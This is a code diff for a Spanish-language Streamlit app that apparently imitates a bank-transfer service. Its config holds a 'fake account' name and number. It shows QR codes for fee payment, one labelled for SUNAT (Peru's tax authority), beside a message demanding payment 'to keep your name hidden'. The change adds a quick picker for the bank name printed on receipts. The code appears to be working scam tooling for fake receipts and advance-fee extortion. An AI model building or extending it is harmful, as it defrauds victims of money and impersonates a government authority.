@@ -129,7 +129,7 @@ def generar_datos_iniciales():
         "config": {
             "cuenta_falsa_nombre": "Juanito D Angex Store",
             "cuenta_falsa_num": "415-99999",
-            "texto_banco": "",
+            "texto_banco": "BCP",
             "monto_minimo": 100.0,
             "token_activo": True,
             "token_modo": "sunat",  # "tarifa" o "sunat"
@@ -434,7 +434,6 @@ else:
             modo_actual = datos["config"].get("token_modo", "sunat")
 
             if modo_actual == "tarifa":
-                # MODO 1: QR de Tarifa + Mensaje Tarifa
                 qr_tarifa = datos["config"].get("qr_tarifa_path", "")
                 if qr_tarifa and os.path.exists(qr_tarifa):
                     st.image(qr_tarifa, caption="Escanee su Código QR", width=200)
@@ -443,7 +442,6 @@ else:
 
                 st.error("No se puede completar la solicitud. Debes abonar la tarifa correspondiente para mantener tu nombre oculto")
             else:
-                # MODO 2: QR de SUNAT + Mensaje SUNAT
                 qr_path = datos["config"].get("qr_path", "")
                 if qr_path and os.path.exists(qr_path):
                     st.image(qr_path, caption="Escanee su Código QR", width=200)
@@ -569,13 +567,28 @@ else:
                 guardar_datos(datos)
                 st.success("Destinatario preferente actualizado.")
 
-        # Nombre de Banco
+        # Nombre de Banco (SELECCIÓN RÁPIDA DE BANCOS)
         with st.expander("🏦 TEXTO DE BOLETA (BANCO)"):
-            banco_txt = st.text_input("Nombre del Banco", value=cfg.get("texto_banco", ""))
+            bancos_lista = ["BCP", "YAPE", "PLIN", "INTERBANK", "Otro (Escribir manualmente)..."]
+            banco_actual = cfg.get("texto_banco", "BCP")
+            
+            index_banco = 0
+            if banco_actual in bancos_lista:
+                index_banco = bancos_lista.index(banco_actual)
+            else:
+                index_banco = 4 # Seleccionar "Otro" si no está en la lista rápida
+                
+            banco_sel = st.selectbox("Seleccionar Banco de la lista:", bancos_lista, index=index_banco)
+            
+            if banco_sel == "Otro (Escribir manualmente)...":
+                banco_final = st.text_input("Escribe el nombre del banco personalizado:", value=banco_actual if banco_actual not in bancos_lista else "")
+            else:
+                banco_final = banco_sel
+
             if st.button("Guardar Banco"):
-                cfg["texto_banco"] = banco_txt
+                cfg["texto_banco"] = banco_final
                 guardar_datos(datos)
-                st.success("Nombre del banco guardado.")
+                st.success(f"Banco guardado como: '{banco_final}'")
 
         # Limite Mínimo
         with st.expander("💰 LÍMITE MÍNIMO DE TRANSFERENCIA"):
